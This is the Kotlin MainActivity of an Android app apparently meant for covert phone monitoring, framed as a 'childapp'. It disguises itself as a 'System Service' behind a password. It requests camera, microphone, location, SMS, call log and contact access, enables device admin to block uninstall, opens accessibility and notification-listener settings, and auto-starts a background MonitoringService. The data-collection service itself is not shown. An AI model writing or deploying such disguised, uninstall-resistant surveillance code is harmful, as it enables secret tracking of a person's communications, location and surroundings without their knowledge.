package com.coc338781.childapp

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val PERMS = mutableListOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CONTACTS
    ).apply {
        if (Build.VERSION.SDK_INT >= 33) {
            add(Manifest.permission.POST_NOTIFICATIONS)
            add(Manifest.permission.READ_MEDIA_IMAGES)
            add(Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
    }.toTypedArray()

    private lateinit var statusText: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        showPasswordScreen()
    }

    // ========== PASSWORD SCREEN ==========
    private fun showPasswordScreen() {
        val layout = LinearLayout(this)
        layout.orientation = LinearLayout.VERTICAL
        layout.setPadding(60, 200, 60, 60)

        val title = TextView(this)
        title.text = "System Service"
        title.textSize = 24f
        layout.addView(title)

        val subtitle = TextView(this)
        subtitle.text = "\n\nEnter password:"
        subtitle.textSize = 14f
        layout.addView(subtitle)

        val passInput = EditText(this)
        passInput.hint = "Password"
        passInput.inputType = android.text.InputType.TYPE_CLASS_TEXT or
                android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
        layout.addView(passInput)

        val loginBtn = Button(this)
        loginBtn.text = "Login"
        layout.addView(loginBtn)

        loginBtn.setOnClickListener {
            val input = passInput.text.toString()
            if (PasswordManager.checkPassword(this, input)) {
                showMainScreen()
            } else {
                Toast.makeText(this, "❌ Wrong password", Toast.LENGTH_SHORT).show()
                passInput.text.clear()
            }
        }

        setContentView(layout)
    }

    // ========== MAIN SCREEN ==========
    private fun showMainScreen() {
        val layout = LinearLayout(this)
        layout.orientation = LinearLayout.VERTICAL
        layout.setPadding(50, 80, 50, 50)

        val title = TextView(this)
        title.text = "System Service — Admin"
        title.textSize = 20f
        layout.addView(title)

        statusText = TextView(this)
        statusText.text = "\n\n✅ Authenticated"
        statusText.textSize = 14f
        layout.addView(statusText)

        // Buttons
        val enableAdminBtn = Button(this)
        enableAdminBtn.text = "Enable Device Admin (Block Uninstall)"
        layout.addView(enableAdminBtn)

        val accBtn = Button(this)
        accBtn.text = "Accessibility Settings"
        layout.addView(accBtn)

        val overlayBtn = Button(this)
        overlayBtn.text = "Overlay Settings"
        layout.addView(overlayBtn)

        val notifBtn = Button(this)
        notifBtn.text = "Notification Access"
        layout.addView(notifBtn)

        val battBtn = Button(this)
        battBtn.text = "Battery Settings"
        layout.addView(battBtn)

        val restartBtn = Button(this)
        restartBtn.text = "Restart Monitoring Service"
        layout.addView(restartBtn)

        val changePassBtn = Button(this)
        changePassBtn.text = "Change Password"
        layout.addView(changePassBtn)

        val uninstallBtn = Button(this)
        uninstallBtn.text = "Disable Protection & Uninstall"
        layout.addView(uninstallBtn)

        // Device Admin
        enableAdminBtn.setOnClickListener { requestDeviceAdmin() }

        accBtn.setOnClickListener {
            try { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) } catch (_: Exception) {}
        }
        overlayBtn.setOnClickListener {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
        }
        notifBtn.setOnClickListener {
            try {
                startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
            } catch (_: Exception) {}
        }
        battBtn.setOnClickListener {
            try {
                startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
            } catch (_: Exception) {}
        }
        restartBtn.setOnClickListener { startServiceNow() }

        changePassBtn.setOnClickListener { showChangePasswordDialog() }

        uninstallBtn.setOnClickListener { showUninstallDialog() }

        setContentView(layout)

        // Auto-start service
        autoSetupAndStart()
    }

    private fun autoSetupAndStart() {
        // Permissions
        if (!hasAll()) {
            ActivityCompat.requestPermissions(this, PERMS, 100)
        }

        // SCHEDULE_EXACT_ALARM
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            try {
                val am = getSystemService(ALARM_SERVICE) as android.app.AlarmManager
                if (!am.canScheduleExactAlarms()) {
                    startActivity(Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM))
                }
            } catch (_: Exception) {}
        }

        // Overlay
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
            }
        }

        // Battery
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val pm = getSystemService(POWER_SERVICE) as PowerManager
                if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                    startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName")))
                }
            } catch (_: Exception) {}
        }

        // Start service
        startServiceNow()
    }

    // ========== DEVICE ADMIN ==========
    private fun requestDeviceAdmin() {
        try {
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val comp = ComponentName(this, MyDeviceAdmin::class.java)
            if (dpm.isAdminActive(comp)) {
                Toast.makeText(this, "✅ Already enabled", Toast.LENGTH_SHORT).show()
                return
            }
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp)
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Block unauthorized uninstall")
            startActivity(intent)
        } catch (e: Exception) {
            Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }

    // ========== CHANGE PASSWORD ==========
    private fun showChangePasswordDialog() {
        val layout = LinearLayout(this)
        layout.orientation = LinearLayout.VERTICAL
        layout.setPadding(40, 40, 40, 40)

        val currentLabel = TextView(this); currentLabel.text = "Current password:"
        layout.addView(currentLabel)
        val currentInput = EditText(this); currentInput.inputType =
            android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
        layout.addView(currentInput)

        val newLabel = TextView(this); newLabel.text = "\nNew password:"
        layout.addView(newLabel)
        val newInput = EditText(this); newInput.inputType =
            android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
        layout.addView(newInput)

        val confirmLabel = TextView(this); confirmLabel.text = "\nConfirm new password:"
        layout.addView(confirmLabel)
        val confirmInput = EditText(this); confirmInput.inputType =
            android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
        layout.addView(confirmInput)

        androidx.appcompat.app.AlertDialog.Builder(this)
            .setTitle("Change Password")
            .setView(layout)
            .setPositiveButton("Change") { _, _ ->
                val curr = currentInput.text.toString()
                val newP = newInput.text.toString()
                val conf = confirmInput.text.toString()
                when {
                    !PasswordManager.checkPassword(this, curr) ->
                        Toast.makeText(this, "❌ Wrong current password", Toast.LENGTH_SHORT).show()
                    newP.length < 4 ->
                        Toast.makeText(this, "❌ Too short", Toast.LENGTH_SHORT).show()
                    newP != conf ->
                        Toast.makeText(this, "❌ Passwords don't match", Toast.LENGTH_SHORT).show()
                    else -> {
                        PasswordManager.setPassword(this, newP)
                        Toast.makeText(this, "✅ Password changed", Toast.LENGTH_SHORT).show()
                    }
                }
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    // ========== UNINSTALL ==========
    private fun showUninstallDialog() {
        val layout = LinearLayout(this)
        layout.orientation = LinearLayout.VERTICAL
        layout.setPadding(40, 40, 40, 40)

        val label = TextView(this); label.text = "Enter password to disable protection:"
        layout.addView(label)
        val input = EditText(this); input.inputType =
            android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
        layout.addView(input)

        androidx.appcompat.app.AlertDialog.Builder(this)
            .setTitle("⚠️ Disable Protection")
            .setView(layout)
            .setPositiveButton("Disable") { _, _ ->
                if (!PasswordManager.checkPassword(this, input.text.toString())) {
                    Toast.makeText(this, "❌ Wrong password", Toast.LENGTH_SHORT).show()
                    return@setPositiveButton
                }
                disableDeviceAdmin()
                stopService(Intent(this, MonitoringService::class.java))
                Toast.makeText(this, "✅ Protection disabled. Uninstall manually.", Toast.LENGTH_LONG).show()
                finish()
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun disableDeviceAdmin() {
        try {
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val comp = ComponentName(this, MyDeviceAdmin::class.java)
            if (dpm.isAdminActive(comp)) {
                dpm.removeActiveAdmin(comp)
            }
        } catch (_: Exception) {}
    }

    // ========== SERVICE ==========
    private fun hasAll(): Boolean {
        for (p in PERMS)
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) return false
        return true
    }

    private fun startServiceNow() {
        try {
            val i = Intent(this, MonitoringService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(i)
            } else {
                startService(i)
            }
            if (::statusText.isInitialized) {
                statusText.text = "\n\n✅ Service Running\n\nClose this app — everything is automatic."
            }
        } catch (e: Exception) {
            if (::statusText.isInitialized) {
                statusText.text = "\n\n❌ ${e.message}"
            }
        }
    }

    override fun onRequestPermissionsResult(r: Int, p: Array<out String>, g: IntArray) {
        super.onRequestPermissionsResult(r, p, g)
        if (hasAll()) startServiceNow()
    }
}
